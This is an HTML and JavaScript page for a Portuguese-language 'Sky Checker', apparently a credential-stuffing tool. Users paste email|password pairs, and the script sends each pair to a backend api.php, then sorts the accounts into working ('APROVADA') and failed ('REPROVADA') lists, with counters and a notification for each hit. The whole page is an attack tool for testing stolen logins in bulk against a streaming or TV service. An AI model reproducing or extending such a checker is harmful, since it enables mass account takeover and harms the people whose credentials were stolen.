

<html>
    <head>
<title>Sky Checker</title>
<style type="text/css">

body{

    text-shadow: black 0px 0px 3px;
    background-size: 100% 100%;
    background-repeat: repeat;
    background: url(http://i.imgur.com/lRCaMt5.png);


 }
</style>
<body>
        <meta charset="utf-8">
        
        <meta name="viewport" content="width=device-width, initial-scale=1">

    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script></head><div id="ads" style="display:none;width: 100%;height: 90px;text-align: center;padding: 10px 0;"></div>

<center>
           <font style="color: red;" size=6>CHECKER SKY FlashReverso</font><br><br>
        <center><textarea name="lista" id="lista" class="form-control" rows="8" placeholder='EMAIL | SENHA' style="width: 600px;"></textarea></center>
            <br>
<input type="button" class="btn btn-danger" style="width: 600px;" id="startc" value="INICIAR" onClick="startParams()">
            
<br><br>
                        
    <i id="demo"><font color="white">STATUS : </font></i>  |  <font color="white">  TOTAL : </font></i><i id='testado' style="color:yellow;"> 0 </i>  |  <font color="white">  CARREGADAS : </font></i><i id='carregada' style="color:cyan;"> 0 </i>  |  <font color="white">  APROVADAS : </font></i> <i id='CLIVE' style="color:lime;"> 0 </i>  |  <font color="white">  REPROVADAS : </font></i>   <i id='CDIE' style="color:red;"> 0 </i><br></div>
<br>
            
       <font color="WHITE">EM FILA : </font></i> <i id="nCheckTM" style="color:yellow;"> N/A </i><br>
         
       <br>
      <font color="white"> PROGRESSO : </font></i> <i id="progress_total" style="color:red;"> N/A </i>  |  <font color="white"> VER </font><font color="lime"> APROVADAS </font></i> <input type="Checkbox" onclick="cvcl()" id="VCL">  |  <font color="white"> VER </font><font color="red"> REPROVADAS </font></i> <input type="Checkbox" onclick="cvcd()" id="VCD"></div></div>
                        
            
        <div id="pgstr"></div>
            <br>
                
                </div>
                <br>
          </div>
          
                  
<span style="color: lime;">|_______________________________ APROVADA _______________________________|</span>
                      <br><br>
                            <i id="nLive" style="display:none;"></i><div id="emLIVE" style="display:none;">
                                      <div id="ALLLIVE" onclick="SelectAll('ALLLIVE');"></div></div><br>
                    
<span style="color: red;">|_______________________________ REPROVADA _______________________________|</span>
                       <br><br>
                            <i id="nDie" style="display:none;"></i><div id="emDIE" style="display:none;">
                                      <div id="ALLDIE" onclick="SelectAll('ALLDIE');"></div></div><br>
                     
         
          
            
            <script type="text/javascript">
                    
                

                    // Params Start with code
             //   document.title = "{Priv8}";
                var cdie = document.getElementById('VCD');
                var clive = document.getElementById('VCL');
                
                // Functions
                function SelectAll(id)
                {
                    document.getElementById(id).focus();
                    document.getElementById(id).select();
                }
                
                function cvcd(){
                    if(cdie.checked == false){
                        document.getElementById("emDIE").style.display = "none";
                        document.getElementById("nDie").style.display = "none";
                    } else if(cdie.checked == true){
                        document.getElementById("emDIE").style.display = "block";
                        document.getElementById("nDie").style.display = "block";
                    } 
                }
                function cvcl(){
                    if(clive.checked == false){
                        document.getElementById("emLIVE").style.display = "none";
                        document.getElementById("nLive").style.display = "none";
                    } else if(clive.checked == true){
                        document.getElementById("emLIVE").style.display = "block";
                        document.getElementById("nLive").style.display = "block";
                    } 
                }
                function startchk(url, chard, pchk){
                    
                    var xmlhttp;
                    if (window.XMLHttpRequest)
                    {
                        xmlhttp=new XMLHttpRequest();
                    }
                    else
                    {
                        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
                    }
                    xmlhttp.onreadystatechange=function()
                    {
                        if (xmlhttp.readyState==4 && xmlhttp.status==200)
                        {
                            var xdata = xmlhttp.responseText;
                            var totaltestado = document.getElementById("testado");
                            var naosei = totaltestado.innerHTML = (eval(totaltestado.innerHTML) + 1);
                            var naosesi = (eval(document.getElementById("testado").innerHTML) + 1);
                            var countlive = (eval(document.getElementById("CLIVE").innerHTML) + 1);
                            var countlixo = (eval(document.getElementById("CDIE").innerHTML) + 1);
                            var resultado = Math.floor((naosei / chard) * 100);
                            var boaporcento = Math.floor((countlive / chard) * 100);
                            var lixoporcento = Math.floor((countlixo / chard) * 100);
                            document.getElementById("nCheckTM").innerHTML = "<font color='yellow'>" +  url + "</font>";
                            document.getElementById("progress_total").innerHTML = "<font style='color: red;'>" + resultado + "%</font>";
                            document.title = "[Progresso: " + resultado + "%" + "]";
                            if (xdata.match(/APROVADA/g)) {    
                                document.getElementById("CLIVE").innerHTML = countlive;
                                document.getElementById("ALLLIVE").innerHTML = document.getElementById("ALLLIVE").innerHTML +  xdata + " \n";
                             //   document.getElementById("progressbarTOTAL").style.width = boaporcento + "%";
                           //     document.getElementById("progressbarTOTAL").innerHTML = boaporcento + "%";
                                notifyMe();
                                
                            } else if (xdata.match(/REPROVADA/g)) {
                                document.getElementById("CDIE").innerHTML = countlixo;
                                document.getElementById("ALLDIE").innerHTML = document.getElementById("ALLDIE").innerHTML + xdata + "\n";
                            //    document.getElementById("progressbarTOTAL").style.width = lixoporcento + "%";
                              //  document.getElementById("progressbarTOTAL").innerHTML = lixoporcento + "%";
                                
                            }
                        }
                    }
                    xmlhttp.open("GET","api.php?lista=" + url ,true);
                    xmlhttp.send();
                }
                
                function listToArray(fullString, separator) {
                    var fullArray = [];
                    
                    if (fullString !== undefined) {
                        if (fullString.indexOf(separator) == -1) {
                            fullAray.push(fullString);
                        } else {
                            fullArray = fullString.split(separator);
                        }
                    }
                    
                    return fullArray;
                }
                function count(mixed_var, mode) {
                    var key, cnt = 0;
                    if (mixed_var === null || typeof mixed_var === 'undefined') {
                        return 0;
                    } else if (mixed_var.constructor !== Array && mixed_var.constructor !== Object) {
                        return 1;
                    }
                    if (mode === 'COUNT_RECURSIVE') {
                        mode = 1;
                    }
                    if (mode != 1) {
                        mode = 0;
                    }
                    for (key in mixed_var) {
                        if (mixed_var.hasOwnProperty(key)) {
                            cnt++;
                            if (mode == 1 && mixed_var[key] && (mixed_var[key].constructor === Array || mixed_var[key].constructor ===
                                                                Object)) {
                                cnt += this.count(mixed_var[key], 1);
                            }
                        }
                    }
                    return cnt;
                }
                function pushcsB(c,p) {
                    document.getElementById(p).innerHTML = document.getElementById(p).innerHTML + c + "\n<br>" ;
                }
                function startParams() {
                    document.getElementById("pgstr").style.display = "block";
                    var textarea = document.getElementById("lista").value;
                    // var textareacount = textarea.split("\n");
                    var textareacount = textarea.split('\n');
                    var textareaMatch = count(textareacount, 'COUNT_RECURSIVE');
                    //Check
                    var myString = textarea;
                    var myArray = listToArray(myString, '\n');
                   
                    document.getElementById("demo").innerHTML = '';
                    document.getElementById("carregada").innerHTML = textareaMatch;   
                    for(var i=0;i<textareaMatch;i++){
                        
                        var cclst = myArray[i];
                        var cemail = cclst.split("|");
                        var csids = 'csid_' + i;
                        var ccids = 'ccid_' + i;
                        
                        var output = document.getElementById("lista").value;
                        output = output.replace(cclst, "");
                        output = output.replace("\n", "");
                        document.getElementById("lista").innerHTML = output;
                        startchk(cclst, textareaMatch, i);
                        
                    }
                    document.getElementById("demo").innerHTML = '<font color="white">STATUS : </font></i><i style="color:lime;"> INICIADO!   </i>';
                }
            </script>
        </center>
    </body>
</html>